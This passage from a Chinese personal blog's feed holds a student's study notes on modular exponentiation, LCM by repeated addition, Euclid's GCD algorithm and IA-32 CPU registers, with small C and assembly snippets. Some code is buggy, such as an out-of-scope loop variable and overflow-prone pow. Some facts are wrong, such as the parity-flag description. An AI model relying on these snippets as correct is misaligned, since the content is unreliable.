    <content type="html"><![CDATA[<blockquote><p>☛ 前天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“<strong>乘法链算</strong>”实现的过程吧。</p></blockquote><h3 id="font-colorbrown一-基础知识font"><a class="markdownIt-Anchor" href="#font-colorbrown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><blockquote><p><font color="navy">1.模运算</font><br>      <strong>① 概念</strong>：模运算，即为<font color="red"><strong>求余数的运算</strong></font><br>      <strong>② 运算符</strong>：模运算的运算符记为 <strong>mod</strong><br>            例如：a mod b = n<br>            表示的意思是<strong>a 除以 b 所得的余数为 r</strong>，而上式中的 <strong>N</strong> 通常称为<strong>模数</strong><br><br>            <strong>例子</strong>：17 mod 11 = 6<br>                        8 mod 7 = 1<br><br><font color="navy">2.同余的相关内容</font><br>      <strong>① 概念</strong>：若 <strong>a mod n = b mod n = r</strong>，记为 a ≡ b (mod n)<br>      <strong>② 例如</strong>：13 mod 7 = 20 mod 7 = 6 ，则<br>            </p><center><font color="red">13 ≡ 20 (mod 7)</font></center><font color="navy">3.模运算的性质</font>- 加法运算：(a + b) mod n = (a mod n + b mod n) mod n;- 减法运算：(a - b) mod n = (a mod n - b mod n) mod n;- 乘法运算：(a × b) mod n = ((a mod n) × (b mod n)) mod n- 分配律：((a + b) mod p × c) mod n = ((a × c) mod p + (b × c) mod p) mod n = (((a × c) mod p) mod n + ((b × c) mod p) mod n)- 结合律：((a + b) mod n + c) mod n = (a + (b + c) mod n) mod n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ((a * b) mod n * c) mod n = (a * (b * c) mod n) mod n- 交换律：(a + b) mod n = (b + a) mod n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;(a * b) mod n = (b * a) mod n</blockquote><h3 id="font-colorbrown二-乘法链算法font"><a class="markdownIt-Anchor" href="#font-colorbrown二-乘法链算法font"></a> <font color="brown">二、乘法链算法</font></h3><blockquote><p><font color="navy">1.什么是乘法链算法</font><br>      <strong>① 如何计算 a<sup>m</sup> mod n？</strong>：<br>            不要直接计算（a × a × a × … × a）mod n，这样会导致因中间结果巨大而计算溢出；<br>      <strong>② 解决的思路</strong>：利用模运算的性质简化中间结果，但即使这样，仍然有技巧，如果直接计算 a × （a ×  … × （a mod n) mod n）mod n，需要计算 m 次模运算，仍然不够优化。<br><br>      <strong>③ 正确的思路</strong>：<font color="red"><strong>将 m 看成 2  的幂次方之和，再利用模运算的性质。</strong></font><br><br>      <strong>④ 例子</strong>：计算 a<sup>25</sup> mod n（m = 25 是 11001）<br>                          a<sup>25 = 11001</sup> mod n = (a<sup>16</sup> * a<sup>8</sup> * a<sup>1</sup>) mod n ——&gt; <strong>乘法链算法</strong></p></blockquote><h3 id="font-colorbrown三-最小公倍数的加法算法代码实现font"><a class="markdownIt-Anchor" href="#font-colorbrown三-最小公倍数的加法算法代码实现font"></a> <font color="brown">三、最小公倍数的加法算法代码实现</font></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Date: 2019.7.15</span></span><br><span class="line"><span class="comment">Function：实现乘法链算法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,n,u,s = <span class="number">1</span>,index,result;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> t;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please enter the base of the dividend:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please enter the index of the dividend:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please enter a divisor:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">index = u;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*将被除数幂形式的指数展开为二进制形式*/</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;u != <span class="number">0</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(u % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">b[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b[i] = <span class="number">0</span>;</span><br><span class="line">u = u &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*乘法链算法实现代码*/</span></span><br><span class="line">t = a;<span class="comment">// 对 a 进行初始化；</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>;m &lt; i;m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[m])<span class="comment">// 当二进制的所在位的值为 1 时进行运算</span></span><br><span class="line">s = t % n * s;<span class="comment">// 求的是将幂次展开后，每个幂次 mod n 的结果之积:（s1 mod n）*（s2 mod n）*……*（si mod n）</span></span><br><span class="line">result = s % n;<span class="comment">// 将所求的结果再与 n 进行模运算：（（s1 mod n）*（s2 mod n）*……*（si mod n））mod n</span></span><br><span class="line">t = <span class="built_in">pow</span>(t,<span class="number">2</span>);<span class="comment">// 每进行一次循环，t 的值就要翻倍</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d^%d mod %d = %d\n"</span>,a,index,n,result);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>说明</strong>：上面的代码实现是我按照自己的思路写出来的，可能在逻辑上会出现一些错误，还希望各位大神批评，或者有更好的算法，也希望各位大神能够在评论区附上你们的算法代码，感激不尽。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;☛ 前天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“&lt;strong&gt;乘法链算&lt;/strong&gt;”实现的过程吧。&lt;/
      
    
    </summary>
    
    
      <category term="密码算法" scheme="https://muzibing.github.io/tags/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>最小公倍数的加法算法实现</title>
    <link href="https://muzibing.github.io/2019/07/18/2019.07.18%EF%BC%8873%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/18/2019.07.18（73）/</id>
    <published>2019-07-17T16:00:00.000Z</published>
    <updated>2019-07-18T06:52:00.701Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>☛ 前天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“<strong>最小公倍数的加法算法</strong>”实现的过程吧。</p></blockquote><h3 id="font-colorbrown一-基础知识font"><a class="markdownIt-Anchor" href="#font-colorbrown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><blockquote><p><font color="navy"><strong>1.公倍数的概念</strong></font><br>      <code>如果 a₁| b,……，an | b，则称 b 是 a1，……，an 的公倍数。</code>而最小公倍数就是所有公倍数里最小的。<br><br><font color="navy"><strong>2.最小公倍数的表示形式</strong></font><br>      最小公倍数的表示形式为</p><center><font color="red">**lcm (a,b) = a 和 b 的最小公倍数**</font></center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：lcm (18,24) = 72</blockquote><h3 id="font-colorbrown二-求最小公倍数font"><a class="markdownIt-Anchor" href="#font-colorbrown二-求最小公倍数font"></a> <font color="brown">二、求最小公倍数</font></h3><blockquote><p><font color="navy"><strong>1.lcm (a,b) = ab / gcd (a,b)</strong></font><br>      <strong>① 推导过程如下</strong>：<br>            设a，b的最大公约数为 d<br>            则a，b的最小公倍数为d * a/d * b/d = ab / d<br>            所以a，b的最小公倍数 * 最大公约数 = ab /d * d = ab<br>            所以ab = lcm（a，b）* gcd（a，b）<br>      <strong>② 存在的问题</strong>：用此方法来求最小公倍数，会计算大量乘法和除法，效率仍然不够高。</p></blockquote><blockquote><p><br><font color="navy"><strong>2.加法计算最小公倍数</strong></font><br>      <strong>① 方法</strong>：两者取最小，反复加自己，相等时停止。<br>      <strong>② 例子</strong>：lcm (6,15) = 30<br>            <strong>06</strong>            <strong>15</strong><br>            12<br>                            30<br>            18<br>            24<br>            30</p></blockquote><h3 id="font-colorbrown三-最小公倍数的加法算法代码实现font"><a class="markdownIt-Anchor" href="#font-colorbrown三-最小公倍数的加法算法代码实现font"></a> <font color="brown">三、最小公倍数的加法算法代码实现</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Date: 2019.7.15</span><br><span class="line">Function：实现寻找最小公倍数</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a1,a2,a,b,lcm;</span><br><span class="line">printf(&quot;Please input two numbers:&quot;);</span><br><span class="line">scanf(&quot;%d%d&quot;,&amp;a1,&amp;a2);</span><br><span class="line">a = a1;</span><br><span class="line">b = a2;</span><br><span class="line">while(a!=b)</span><br><span class="line">&#123;</span><br><span class="line">if(a &lt; b)</span><br><span class="line">a = a + a1;</span><br><span class="line">else</span><br><span class="line">b = b + a2;</span><br><span class="line">&#125;</span><br><span class="line">lcm = a;</span><br><span class="line">printf(&quot;lcm(%d,%d) = %d\n&quot;,a1,a2,lcm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>**说明：**上面的代码实现是我按照自己的思路写出来的，可能在逻辑上会出现一些错误，还希望各位大神批评，或者有更好的算法，也希望各位大神能够在评论区附上你们的算法代码，感激不尽。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;☛ 前天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“&lt;strong&gt;最小公倍数的加法算法&lt;/strong&gt;”实现的
      
    
    </summary>
    
    
      <category term="密码算法" scheme="https://muzibing.github.io/tags/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>欧几里得算法的实现</title>
    <link href="https://muzibing.github.io/2019/07/15/2019.07.15%EF%BC%8872%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/15/2019.07.15（72）/</id>
    <published>2019-07-14T16:00:00.000Z</published>
    <updated>2019-07-15T14:44:59.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>☛ 今天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“欧几里得算法”的过程吧。</p></blockquote><h3 id="font-colorbrown一-基础知识font"><a class="markdownIt-Anchor" href="#font-colorbrown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><blockquote><p><font color="navy"><strong>1.最大公约数的概念</strong></font><br>      公约数中最大的那个称为a<sub>1</sub>，a<sub>2</sub>，……，a<sub>n</sub>的最大公约数，记为：<strong>gcd(a<sub>1</sub>，a<sub>2</sub>，……，a<sub>n</sub>)</strong>。<br>      例如：<br>      gcd(11,77) = 11<br><br><font color="navy"><strong>2.互素</strong></font><br>      若 <strong>gcd(a<sub>1</sub>，a<sub>2</sub>，……，a<sub>n</sub>) = 1</strong>，也就是说 a<sub>1</sub>，a<sub>2</sub>，……，a<sub>n</sub> 的<strong>最大公约数为 1</strong>，那么称 a<sub>1</sub>，a<sub>2</sub>，……，a<sub>n</sub> 是互素的。<br><br><font color="navy"><strong>3.最大公约数的性质</strong></font><br>      ❁ <strong>在互素的正整数中，不一定有素数</strong><br>            例如：gcd(25,42) = 1，但是 25 和 42 都不是素数<br>      ❁ <strong>在个数不少于 3 个的互素正整数中，不一定两两互素</strong><br>            例如：gcd(6,10,45) = 1，但是：<br>            gcd(6,10) = 2；gcd(6,45) = 3；gcd(10,45) = 5；</p></blockquote><h3 id="font-colorbrown二-欧几里得算法font"><a class="markdownIt-Anchor" href="#font-colorbrown二-欧几里得算法font"></a> <font color="brown">二、欧几里得算法</font></h3><blockquote><p><font color="navy"><strong>1.欧几里得算法（辗转相除法）</strong></font><br>      辗转相除法， 又名欧几里德算法（Euclidean algorithm），<strong>是求最大公约数的一种方法</strong>。它的具体做法是：<font color="blue">用较大数除以较小数，再用出现的余数（第一余数）去除除数，再用出现的余数（第二余数）去除第一余数，如此反复，直到最后余数是0为止。如果是求两个数的最大公约数，那么最后的除数就是这两个数的最大公约数。</font><br><br><font color="navy"><strong>2.欧几里得算法的原理</strong></font><br>      <strong>若 a = b * d + r，则 gcd(a,b) = gcd(b,r)</strong><br>      <strong>注释</strong>：a：被除数；b：除数；d：商；r：余数；<br><br>      <strong>【例子】</strong>：已知 a = 63，b = 24，利用欧几里得算法求得两个数的最大公约数。<br>      <strong>【解】</strong><br>                 63 ÷ 24 = 2 ······ 15<br>                 24 ÷ 15 = 1 ······ 9<br>                 15 ÷ 9 = 1 ······ 6<br>                 9 ÷ 6 = 1 ······ 3<br>                 6 ÷ 3 = 2<br>             <strong>∴</strong> gcd(63,24) = gcd(6,3) = 3<br><br><font color="navy"><strong>3.欧几里得算法的推导</strong></font><br>      设两数为a、b(a&gt;b)，用 gcd(a,b) 表示a，b的最大公约数，r = a (mod b) 为 a 除以 b 的余数，k 为 a 除以 b 的商，即 a÷ b = k ······ r  。辗转相除法即是要证明 gcd(a,b) = gcd(b,r)  。<br>      <strong>第一步</strong>：令 c = gcd(a,b)  ，则设 a = mc，b = nc<br>      <strong>第二步</strong>：根据前提可知  <strong><code>r = a - kb = mc - knc = (m - kn) * c</code></strong><br>      <strong>第三步</strong>：根据第二步结果可知， c 也是 r 的因数<br>      <strong>第四步</strong>：可以断定 <strong>m -kn  与 n 互质</strong>（这里用反证法进行证明：设 <strong><code>m -kn = xd，n = yd (d &gt; 1)</code></strong> ，则 <strong><code>m = kn +xd = kyd + xd = (ky + x) * d ，则 a = mc =(ky + x) * cd，b = nc = ycd</code></strong>，则 a 与 b 的一个公约数 cd &gt; c ，故c非a与b的最大公约数，与前面结论矛盾，因此c也是b与r的最大公约数）从而可知 gcd(b,r) = c ，继而  gcd(a,b) = gcd(b,r) 。<br>      证毕<br>      注：以上步骤的操作是建立在刚开始时 r ≠ 0 的基础之上的，即 m 与 n 亦互质。<br><br><font color="navy"><strong>3.欧几里得算法的实现（C语言实现）</strong></font></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Date: 2019.7.15</span><br><span class="line">Function：欧几里得算法的实现</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a1,a2,temp,gcd,n;</span><br><span class="line">printf(&quot;Please input two number:&quot;);</span><br><span class="line">scanf(&quot;%d%d&quot;,&amp;a1,&amp;a2);</span><br><span class="line">printf(&quot;gcd(%d,%d) = &quot;,a1,a2);</span><br><span class="line"></span><br><span class="line">/*对所求的两个数进行排序，从大到小*/</span><br><span class="line">if(a1 &lt;= a2)</span><br><span class="line">&#123;</span><br><span class="line">temp = a2;</span><br><span class="line">a2 = a1;</span><br><span class="line">a1 = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*欧几里得算法的实现*/</span><br><span class="line">n = a1 % a2;// 求大数对小数的取余</span><br><span class="line">while(n)// 如果求得的余数不等于0，则按照辗转相除的方法进行计算，知道得到的余数等于0</span><br><span class="line">&#123;</span><br><span class="line">a1 = a2;</span><br><span class="line">a2 = n;</span><br><span class="line">n = a1 % a2;</span><br><span class="line">if(!n)</span><br><span class="line">gcd = a2;</span><br><span class="line">&#125;</span><br><span class="line">gcd = a2;// 如果求得的余数等于0，说明a1能被a2整除，也就是说a2是a1的一个公约数，那么a1和a2的最大公约数就是a2</span><br><span class="line">printf(&quot;gcd(%d,%d) = %d\n&quot;,a1,a2,gcd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>**说明：**上面的代码实现是我按照自己的思路写出来的，可能在逻辑上会出现一些错误，还希望各位大神批评，或者有更好的算法，也希望各位大神能够在评论区附上你们的算法代码，感激不尽。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;☛ 今天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“欧几里得算法”的过程吧。&lt;/p&gt;
&lt;/blockquote&gt;

      
    
    </summary>
    
    
      <category term="密码算法" scheme="https://muzibing.github.io/tags/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>《软件安全分析与应用》第 2 章：基础知识学习笔记(1)</title>
    <link href="https://muzibing.github.io/2019/07/13/2019.07.13%EF%BC%8871%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/13/2019.07.13（71）/</id>
    <published>2019-07-12T16:00:00.000Z</published>
    <updated>2019-07-15T14:45:11.598Z</updated>
    
    <content type="html"><![CDATA[<p><font color="navy"><strong>1、CPU 的结构包括寄存器、算术逻辑单元（ALU）、控制器和内部总线</strong></font></p><blockquote><ul><li><strong>寄存器</strong>：提供CPU的内部存储，用来暂时存方参与运算的数据及运算结果，不同的寄存器代表了不同的物理含义，应用到不同的功能场景</li><li><strong>算术逻辑单元</strong>：执行计算机的运算功能，包括：+、-、*、÷，左右移位运算，与、或、非、异或逻辑运算</li><li><strong>控制器</strong>：控制计算机各部件工作，包括取指、译码、执行</li><li><strong>内部总线</strong>：将寄存器、ALU 以及控制器进行互连，提供通信机制</li></ul></blockquote><p><font color="navy"><strong>2、冯·诺伊曼CPU的运作原理可分为四个阶段：提取、解码、执行和写回</strong></font></p><blockquote><ul><li><strong>提取</strong>：从程序内存中检索指令，指令的提取往往必须从相对较慢的存储器查找</li><li><strong>解码</strong>：CPU 将提取到的指令被拆解为有意义的片段；</li><li><strong>执行</strong>：连接到各种能够进行所需运算的 CPU 部件：例如，要求一个加法运算，算术逻辑单元将会连接到一组输入和一组输出。输入提供了要相加的数值，而且在输出将含有总和结果。ALU内含电路系统，以于输出端完成简单的普通运算和逻辑运算（比如加法和位操作）。如果加法运算产生一个对该CPU处理而言过大的结果，在标志寄存器里，溢出标志可能会被设置；</li><li><strong>写回</strong>：以一定格式将执行阶段的结果简单的写回</li></ul><p>许多复杂的CPU可以一次提取多个指令、解码，并且同时执行。这个部分一般涉及“<strong>经典RISC管线</strong>”，那些实际上是在众多使用简单CPU的电子设备中快速普及（常称为微控制器）</p></blockquote><p><font color="navy"><strong>3、IA-32 的 CPU 寄存器</strong></font></p><blockquote><p>IA-32 的 CPU 寄存器包括指令指针寄存器、通用数据寄存器、地址指针寄存器、变址指针寄存器、标志位寄存器、段寄存器、控制寄存器等</p><ul><li><font color="red"><strong>指令指针寄存器</strong></font>：EIP，存储了当前执行指令的地址，系统根据该寄存器进行寻址，从内存中取出指令，然后再译码、执行；</li><li><font color="red"><strong>通用数据寄存器</strong></font>：EAX、ECX、EDX、EBX<br>     ○ EAX、EDX，常作为乘除法指令的隐含操作数；16位的通用数据寄存器为AX、CX、DX、BX；<br>     ○ ECX，常被用于存储循环处理指令的循环次数；<br>     ○ EBX</li><li><font color="red"><strong>地址指针寄存器</strong></font>：ESP、EBP<br>     ○ ESP：记录了当前的栈顶，call、ret、push、pop、pusha、popa等指令会改变ESP寄存器的值；<br>     ○ EBP：通常记录的是当前函数的栈底</li><li><font color="red"><strong>变址指针寄存器</strong></font>：ESI、EDI，这两个操作数常作为隐含操作数，指令执行完成后自动递增实现变址<br>     ○ ESI：操作数源地址<br>     ○ EDI：操作数目的地址</li><li><font color="red"><strong>标志位寄存器</strong></font>：统称为 EFLAGS：CF、PF、AF、ZF、SF、TF、IF、DF、OF、IOPL、NT、RF、VM、AC、VIF、VIP、ID<br><br>标志位寄存器是仅仅用来操纵bit的寄存器，任何指令都会根据计算的结果影响到标志位寄存器。比如说，经过一个减法操作，如果结果是0，那么zero flag就会被设置，如果不是0，其值会被清掉<br>     ⚑ CF：进位标志，如果无符号运算产生进位或借位则值为1，否则值为0<br>     ⚑ PF：奇偶标志，用于表示运算结果中1的个数的奇偶性，偶数个 1 时值为 1，奇数个 1 时值为 1；<br>     ⚑ AF：辅助进位标志，在字节操作时标记低字节（低 4 位）是否向高字节（高 4 位）进位或借位；<br>     ⚑ ZF：零标志，运算结果为 0 时其值置 1 ，否则置 0；<br>     ⚑ SF：符号标志，有符号数运算结果小于 0 时置 1，否则置 0<br>     ⚑ IF：中断允许标志，，决定 CPU　是否响应 CPU 外部的可屏蔽中断发出的中断请求，置 1 时可以响应中断，置 0 时不响应中断<br>     ⚑ DF：方向标志<br>     ⚑ OF：溢出标志，有符号运算发生溢出时置 1，否则置 0；<br>     ⚑ IOPL：用于表示当前进程的 I/O 特权级别，只有当前进程的 CPL 小于或等于 IOPL 时才能访问 I/O 地址空间<br>     ⚑ NT：嵌套任务标志，置 1 表明当前任务是在另一个任务中嵌套执行，置 0 表明非嵌套<br>     ⚑ RF：恢复标志，置 1 禁用指令断点，置 0 允许指令断点<br>     ⚑ VM：虚拟 8086 模式标志，置 1 运行在虚拟 8086 模式，置 0 运行在保护模式<br>     ⚑ AC：对齐检测标志<br>     ⚑ VIF：虚拟中断标志，是 IF 标志的一个虚拟映像，与 VIP 标志一起使用<br>     ⚑ VIP：虚拟中断等待标志，置 1 表示有一个等待处理的中断，置 0 表示没有等待处理的中断<br>     ⚑ ID：识别标志，置 1 表示支持 CPUID 指令，置 0 表示不支持</li><li><font color="red"><strong>段寄存器</strong></font>：代码段寄存器 CS，数据段寄存器 DS，堆栈段寄存器 SS，附加段寄存器 ES、FS、GS<br>     ○ 实模式下段寄存器通常与指针寄存器（如ESP、EDI、ESI等）联合使用</li><li><font color="red"><strong>控制寄存器</strong></font>：CR0、CR1、CR2、CR3、CR4，用于记录处理器的运行模式和当前执行任务的属性</li></ul></blockquote><p><font color="navy"><strong>4.常用寄存器的说明</strong></font></p><blockquote><p>    <strong>寄存器</strong>                                <strong>全称</strong>                                                                          <strong>说明</strong><br>     EAX              Extended Accumulator X累加寄存器                              A代表Accumulator<br>     ECX              Extended Counting X计数寄存器                                      C代表counting<br>     EDI           Extended Destination Indexing目的索引寄存器          D代表destnation，I代表Indexing<br>     ESI           Extended Source Indexing源索引寄存器                     S代表Source，I代表Indexing<br>     ESP            Extended Stack Pointer栈指针寄存器                                       S代表Stack<br>     EBP          Extended (Stack) Base Pointer栈基指针寄存器                          B代表Base<br>     EIP             Extended Instructions Pointer指令寄存器                            I代表Instruction</p></blockquote><p><font color="navy"><strong>5.有关寄存器的代码</strong></font></p><blockquote><p>下面的代码很具有参考价值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void SomeProcedure (int anArgument)</span><br><span class="line">&#123;</span><br><span class="line">  int aVariable;</span><br><span class="line">  aVariable = anArgument;</span><br><span class="line">&#125;</span><br><span class="line">SomeProcedure: PUSH EBP            ;save original value of EBP on stack</span><br><span class="line">               MOV  EBP,ESP        ;store top of stack address in EBP</span><br><span class="line">               SUB  ESP,4          ;allocate space for aVariable on stack</span><br><span class="line">               MOV  EAX,[EBP+8]    ;fetch anArgument into EAX, which is</span><br><span class="line">                                   ;8 bytes below the stored top of stack</span><br><span class="line">               MOV  [EBP-4],EAX    ;4 bytes above the stored top of stack</span><br><span class="line">       MOV  ESP,EBP        ;free space allocated for aVariable</span><br><span class="line">               POP  EBP            ;restore original value of EBP</span><br><span class="line">               RET                 ;return to the caller</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font color=&quot;navy&quot;&gt;&lt;strong&gt;1、CPU 的结构包括寄存器、算术逻辑单元（ALU）、控制器和内部总线&lt;/strong&gt;&lt;/font&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;寄存器&lt;/strong&gt;：提供CPU的内部存储，
      
    
    </summary>
    
    
      <category term="《软件安全分析与应用》" scheme="https://muzibing.github.io/tags/%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B/"/>
    
  </entry>
  
  <entry>
    <title>《软件安全分析与应用》第 1 章：绪论学习笔记</title>
    <link href="https://muzibing.github.io/2019/07/12/2019.07.12%EF%BC%8870%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/12/2019.07.12（70）/</id>
    <published>2019-07-11T16:00:00.000Z</published>
    <updated>2019-07-15T14:45:19.926Z</updated>
    
